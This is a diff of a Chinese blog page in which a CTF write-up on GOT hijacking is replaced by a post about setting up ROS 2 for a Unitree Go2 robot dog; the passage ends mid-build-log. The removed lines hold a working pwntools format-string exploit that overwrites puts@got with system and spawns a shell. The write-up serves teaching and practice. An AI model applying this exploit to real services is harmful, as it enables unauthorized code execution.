@@ -19,27 +19,28 @@
   <meta name="author" content="花時雨">
   <meta name="keywords" content="">
   
-    <meta name="description" content="原理在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的">
+    <meta name="description" content="前情：学校之前买了台机器狗，最近Yeuoui提起这个事说有空可以到实验室里来玩玩，但由于是学校的东西笔者又不是正经大学生（苦逼高中生一枚）没有对于机器人方向有深入的了解因此只打算玩玩简单的功能因此也不太敢拆（主要是Yeuoui说怕拆了装不回去（悲）），那我们只能来探讨下怎么在不拆狗的情况下去做些更意义不明有意思的事情。     环境搭建我们的机器狗的型号是Unitree Go2 Pro，我的环境是">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【PWN.0x02】Linux PWN：Hijack Got">
-<meta property="og:url" content="https://zer0ptr.github.io/2026/01/24/fmtstr-exploit-hijackgot/index.html">
+<meta property="og:title" content="【ROBOT.0x00】如何在不拆开机器狗的情况下优雅地对其进行二开">
+<meta property="og:url" content="https://zer0ptr.github.io/2026/05/06/unitree-debug-learning-1/index.html">
 <meta property="og:site_name" content="花時雨的流水账">
-<meta property="og:description" content="原理在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的">
+<meta property="og:description" content="前情：学校之前买了台机器狗，最近Yeuoui提起这个事说有空可以到实验室里来玩玩，但由于是学校的东西笔者又不是正经大学生（苦逼高中生一枚）没有对于机器人方向有深入的了解因此只打算玩玩简单的功能因此也不太敢拆（主要是Yeuoui说怕拆了装不回去（悲）），那我们只能来探讨下怎么在不拆狗的情况下去做些更意义不明有意思的事情。     环境搭建我们的机器狗的型号是Unitree Go2 Pro，我的环境是">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zer0ptr.github.io/images/banner/hijackgot.png">
-<meta property="article:published_time" content="2026-01-23T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-01T16:27:42.558Z">
+<meta property="og:image" content="https://zer0ptr.github.io/images/unitree_go_1/1.jpg">
+<meta property="article:published_time" content="2026-05-06T13:34:08.000Z">
+<meta property="article:modified_time" content="2026-05-08T10:47:13.787Z">
 <meta property="article:author" content="花時雨">
-<meta property="article:tag" content="格式化字符串漏洞">
-<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Unitree">
+<meta property="article:tag" content="Unitree Go2">
+<meta property="article:tag" content="宇树机器狗">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://zer0ptr.github.io/images/banner/hijackgot.png">
+<meta name="twitter:image" content="https://zer0ptr.github.io/images/unitree_go_1/1.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>【PWN.0x02】Linux PWN：Hijack Got - 花時雨的流水账</title>
+  <title>【ROBOT.0x00】如何在不拆开机器狗的情况下优雅地对其进行二开 - 花時雨的流水账</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -421,7 +422,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="【PWN.0x02】Linux PWN：Hijack Got"></span>
+            <span id="subtitle" data-typed-text="【ROBOT.0x00】如何在不拆开机器狗的情况下优雅地对其进行二开"></span>
           
         </div>
 
@@ -432,8 +433,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-01-24 00:00" pubdate>
-          2026年1月24日 凌晨
+        <time datetime="2026-05-06 21:34" pubdate>
+          2026年5月6日 晚上
         </time>
       </span>
     
@@ -444,7 +445,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.1k 字
+          6.4k 字
         
       </span>
     
@@ -455,7 +456,7 @@
         
         
         
-          34 分钟
+          54 分钟
         
       </span>
     
@@ -494,56 +495,67 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">【PWN.0x02】Linux PWN：Hijack Got</h1>
+            <h1 id="seo-header">【ROBOT.0x00】如何在不拆开机器狗的情况下优雅地对其进行二开</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有开启 RELRO 保护的前提下，<strong>每个 libc 的函数对应的 GOT 表项是可以被修改的</strong>。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p>
-<p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤：</p>
-<ul>
-<li>确定函数 A 的 GOT 表地址。<ul>
-<li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li>
-</ul>
-</li>
-<li>确定函数 B 的内存地址<ul>
-<li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li>
-</ul>
-</li>
-<li>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。<ul>
-<li>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种<ul>
-<li>写入函数：write 函数。</li>
-<li>ROP  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">pop eax; ret;           # printf@got -&gt; eax<br>pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx<br>add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset<br></code></pre></td></tr></table></figure></li>
-<li>格式化字符串任意地址写</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="例子-2016-CCTF-Pwn3"><a href="#例子-2016-CCTF-Pwn3" class="headerlink" title="例子 - 2016 CCTF Pwn3"></a>例子 - 2016 CCTF Pwn3</h2><h3 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># zer0ptr @ DESKTOP-FHEMUHT in ~/CTF-Training/Pwn/fmtstr/hijack-GOT/2016-CCTF-pwn3 on git:master x [12:18:24]</span><br>$ checksec pwn3<br>[*] <span class="hljs-string">&#x27;/home/zer0ptr/CTF-Training/Pwn/fmtstr/hijack-GOT/2016-CCTF-pwn3/pwn3&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
-<p>可以看出程序主要开启了 NX 保护。我们一般默认远程都是开启 ASLR 保护的。</p>
-<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> command; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+14h] [ebp-2Ch] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+3Ch] [ebp-4h]</span><br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  ask_username(s1);<br>  ask_password(s1);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      print_prompt();<br>      command = get_command();<br>      v5 = command;<br>      <span class="hljs-keyword">if</span> ( command != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      put_file();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( command == <span class="hljs-number">3</span> )<br>    &#123;<br>      show_dir();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( command != <span class="hljs-number">1</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>      get_file();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+                <p>前情：学校之前买了台机器狗，最近Yeuoui提起这个事说有空可以到实验室里来玩玩，但由于是学校的东西笔者又不是正经大学生（苦逼高中生一枚）没有对于机器人方向有深入的了解因此只打算玩玩简单的功能因此也不太敢拆（主要是Yeuoui说怕拆了装不回去（悲）），那我们只能来探讨下怎么在不拆狗的情况下去做些更<del>意义不明</del>有意思的事情。    </p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我们的机器狗的型号是<strong>Unitree Go2 Pro</strong>，我的环境是Ubuntu22.04。</p>
+<h3 id="安装ROS2"><a href="#安装ROS2" class="headerlink" title="安装ROS2"></a>安装ROS2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/unitreerobotics/unitree_ros2.git<br></code></pre></td></tr></table></figure>
 
-<p>get_file func</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_file</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">200</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-FCh] BYREF</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+E4h] [ebp-34h] BYREF</span><br>  <span class="hljs-type">char</span> *i; <span class="hljs-comment">// [esp+10Ch] [ebp-Ch]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;enter the file name you want to get:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%40s&quot;</span>, s1);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-number">4u</span>) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;too young, too simple&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = (<span class="hljs-type">char</span> *)file_head; i; i = (<span class="hljs-type">char</span> *)*((_DWORD *)i + <span class="hljs-number">60</span>) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(i, s1) )<br>    &#123;<br>      <span class="hljs-built_in">strcpy</span>(dest, i + <span class="hljs-number">40</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(dest);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(dest);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>首先把ros的源码拉下来然后编译，ROS 2 Humble：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 启用 Ubuntu Universe 仓库</span><br><span class="hljs-built_in">sudo</span> apt install software-properties-common<br><span class="hljs-built_in">sudo</span> add-apt-repository universe<br><br><span class="hljs-comment"># 2. 添加 ROS 2 GPG 密钥</span><br><span class="hljs-built_in">sudo</span> apt update &amp;&amp; <span class="hljs-built_in">sudo</span> apt install curl -y<br><span class="hljs-built_in">sudo</span> curl -sSL https://raw.githubusercontent.com/ros/rosdistro/master/ros.key -o /usr/share/keyrings/ros-archive-keyring.gpg<br><br><span class="hljs-comment"># 3. 添加 ROS 2 仓库到源列表</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [arch=<span class="hljs-subst">$(dpkg --print-architecture)</span> signed-by=/usr/share/keyrings/ros-archive-keyring.gpg] http://packages.ros.org/ros2/ubuntu <span class="hljs-subst">$(source /etc/os-release &amp;&amp; echo $UBUNTU_CODENAME)</span> main&quot;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/ros2.list &gt; /dev/null<br></code></pre></td></tr></table></figure>
 
-<p>首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞。</p>
-<h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路:</p>
-<ul>
-<li>绕过密码</li>
-<li>确定格式化字符串参数偏移</li>
-<li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址</li>
-<li>修改 puts@got 的内容为 system 的地址</li>
-<li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数</li>
-</ul>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>pwn3 = ELF(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br><span class="hljs-comment"># sh = process(&#x27;./pwn3&#x27;)</span><br>sh = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">12345</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">name</span>):<br>    sh.sendline(<span class="hljs-string">b&#x27;get&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&#x27;enter the file name you want to get:&#x27;</span>)<br>    sh.sendline(name)<br>    data = sh.recv()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put</span>(<span class="hljs-params">name, content</span>):<br>    sh.sendline(<span class="hljs-string">b&#x27;put&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&#x27;please enter the name of the file you want to upload:&#x27;</span>)<br>    sh.sendline(name)<br>    sh.recvuntil(<span class="hljs-string">b&#x27;then, enter the content:&#x27;</span>)<br>    sh.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_dir</span>():<br>    sh.sendline(<span class="hljs-string">b&#x27;dir&#x27;</span>)<br><br>tmp = <span class="hljs-string">&#x27;sysbdmin&#x27;</span><br>name = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp:<br>    name += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i) - <span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">password</span>():<br>    sh.recvuntil(<span class="hljs-string">b&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)<br>    sh.sendline(name.encode())  <br><br>password()<br><br>puts_got = pwn3.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;puts got : &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_got))<br><br>put(<span class="hljs-string">b&#x27;1111&#x27;</span>, <span class="hljs-string">b&#x27;%8$s&#x27;</span> + p32(puts_got))<br>puts_addr = u32(get(<span class="hljs-string">b&#x27;1111&#x27;</span>)[:<span class="hljs-number">4</span>])<br>log.success(<span class="hljs-string">&#x27;puts addr : &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc base : &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-string">&#x27;system addr : &#x27;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br><br>log.info(<span class="hljs-string">&#x27;puts offset in libc: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>log.info(<span class="hljs-string">&#x27;system offset in libc: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>payload = fmtstr_payload(<span class="hljs-number">7</span>, &#123;puts_got: system_addr&#125;, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>put(<span class="hljs-string">b&#x27;/bin/sh;&#x27;</span>, payload)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;get&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">b&#x27;enter the file name you want to get:&#x27;</span>)<br><br>sh.sendline(<span class="hljs-string">b&#x27;/bin/sh;&#x27;</span>)<br><br>show_dir()<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+<p>接下来安装ROS2 Humble：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 ROS 2 Humble 桌面版（包含所有常用工具）</span><br><span class="hljs-built_in">sudo</span> apt install ros-humble-desktop python3-colcon-common-extensions<br></code></pre></td></tr></table></figure>
 
-<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><blockquote>
-<ul>
-<li>我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。  </li>
-<li>这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。</li>
-</ul>
+<p>然后是安装 Go2 需要的 ROS 2 包  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装依赖包</span><br><span class="hljs-built_in">sudo</span> apt install ros-humble-rmw-cyclonedds-cpp<br><span class="hljs-built_in">sudo</span> apt install ros-humble-rosidl-generator-dds-idl<br></code></pre></td></tr></table></figure>
+
+<p>配置 ROS 2 环境：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 将 ROS 2 环境变量添加到 .bashrc</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source /opt/ros/humble/setup.bash&quot;</span> &gt;&gt; ~/.bashrc<br><span class="hljs-built_in">source</span> ~/.bashrc<br><br><span class="hljs-comment"># 验证安装</span><br>ros2 --version<br></code></pre></td></tr></table></figure>
+
+<p>看到类似的输出就说明你的环境配置好辣~</p>
+<p><img src="/images/unitree_go_1/2.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>打pwn的ubuntu用来搞机器狗可还行(</p>
 </blockquote>
+<h3 id="编译Unitree的代码"><a href="#编译Unitree的代码" class="headerlink" title="编译Unitree的代码"></a>编译Unitree的代码</h3><p>编译 DDS 中间件，这个编译需要 3-5 分钟，会看到大量编译输出。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/unitree_ros2/unitree_ros2/cyclonedds_ws<br>colcon build<br></code></pre></td></tr></table></figure>
+<p>报错了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwn@pwn:~/Desktop/unitree/unitree_ros2/cyclonedds_ws$ <span class="hljs-built_in">ls</span><br>src<br>pwn@pwn:~/Desktop/unitree/unitree_ros2/cyclonedds_ws$ colcon build<br>Starting &gt;&gt;&gt; unitree_api<br>Starting &gt;&gt;&gt; unitree_go<br>Starting &gt;&gt;&gt; unitree_hg<br>--- stderr: unitree_hg                                                                    <br>CMake Error at /opt/ros/humble/share/rosidl_adapter/cmake/rosidl_adapt_interfaces.cmake:59 (message):<br>  execute_process(/usr/bin/python3 -m rosidl_adapter --package-name<br>  unitree_hg --arguments-file<br>  /home/pwn/Desktop/unitree/unitree_ros2/cyclonedds_ws/build/unitree_hg/rosidl_adapter__arguments__unitree_hg.json<br>  --output-dir<br>  /home/pwn/Desktop/unitree/unitree_ros2/cyclonedds_ws/build/unitree_hg/rosidl_adapter/unitree_hg<br>  --output-file<br>  /home/pwn/Desktop/unitree/unitree_ros2/cyclonedds_ws/build/unitree_hg/rosidl_adapter/unitree_hg.idls)<br>  returned error code 1:<br><br>  AttributeError processing template <span class="hljs-string">&#x27;msg.idl.em&#x27;</span><br><br>  Traceback (most recent call last):<br><br>    File <span class="hljs-string">&quot;/opt/ros/humble/local/lib/python3.10/dist-packages/rosidl_adapter/resource/__init__.py&quot;</span>, line 51, <span class="hljs-keyword">in</span> evaluate_template<br>      em.BUFFERED_OPT: True,<br><br>  AttributeError: module <span class="hljs-string">&#x27;em&#x27;</span> has no attribute <span class="hljs-string">&#x27;BUFFERED_OPT&#x27;</span><br><br>  <br><br>  During handling of the above exception, another exception occurred:<br><br>  <br><br>  Traceback (most recent call last):<br><br>    File <span class="hljs-string">&quot;/usr/lib/python3.10/runpy.py&quot;</span>, line 196, <span class="hljs-keyword">in</span> _run_module_as_main<br>      <span class="hljs-built_in">return</span> _run_code(code, main_globals, None,<br>    File <span class="hljs-string">&quot;/usr/lib/python3.10/runpy.py&quot;</span>, line 86, <span class="hljs-keyword">in</span> _run_code<br>      <span class="hljs-built_in">exec</span>(code, run_globals)<br>    File <span class="hljs-string">&quot;/opt/ros/humble/local/lib/python3.10/dist-packages/rosidl_adapter/__main__.py&quot;</span>, line 19, <span class="hljs-keyword">in</span> &lt;module&gt;<br>      sys.exit(main())<br>    File <span class="hljs-string">&quot;/opt/ros/humble/local/lib/python3.10/dist-packages/rosidl_adapter/main.py&quot;</span>, line 53, <span class="hljs-keyword">in</span> main<br>      abs_idl_file = convert_to_idl(<br>    File <span class="hljs-string">&quot;/opt/ros/humble/local/lib/python3.10/dist-packages/rosidl_adapter/__init__.py&quot;</span>, line 19, <span class="hljs-keyword">in</span> convert_to_idl<br>      <span class="hljs-built_in">return</span> convert_msg_to_idl(<br>    File <span class="hljs-string">&quot;/opt/ros/humble/local/lib/python3.10/dist-packages/rosidl_adapter/msg/__init__.py&quot;</span>, line 39, <span class="hljs-keyword">in</span> convert_msg_to_idl<br>      expand_template(<span class="hljs-string">&#x27;msg.idl.em&#x27;</span>, data, output_file, encoding=<span class="hljs-string">&#x27;iso-8859-1&#x27;</span>)<br>    File <span class="hljs-string">&quot;/opt/ros/humble/local/lib/python3.10/dist-packages/rosidl_adapter/resource/__init__.py&quot;</span>, line 23, <span class="hljs-keyword">in</span> expand_template<br>      content = evaluate_template(template_name, data)<br>    File <span class="hljs-string">&quot;/opt/ros/humble/local/lib/python3.10/dist-packages/rosidl_adapter/resource/__init__.py&quot;</span>, line 69, <span class="hljs-keyword">in</span> evaluate_template<br>      _interpreter.shutdown()<br><br>  AttributeError: <span class="hljs-string">&#x27;NoneType&#x27;</span> object has no attribute <span class="hljs-string">&#x27;shutdown&#x27;</span><br><br>Call Stack (most recent call first):<br>  /opt/ros/humble/share/rosidl_cmake/cmake/rosidl_generate_interfaces.cmake:130 (rosidl_adapt_interfaces)<br>  CMakeLists.txt:28 (rosidl_generate_interfaces)<br><br><br>---<br>Failed   &lt;&lt;&lt; <span class="hljs-string">unitree_hg [1.24s, exited with code 1]</span><br><span class="hljs-string">Aborted  &lt;&lt;&lt; unitree_api [1.25s]</span><br><span class="hljs-string">Aborted  &lt;&lt;&lt; unitree_go [1.24s]</span><br><span class="hljs-string"></span><br><span class="hljs-string">Summary: 0 packages finished [1.61s]</span><br><span class="hljs-string">  1 package failed: unitree_hg</span><br>  2 packages aborted: unitree_api unitree_go<br>  3 packages had stderr output: unitree_api unitree_go 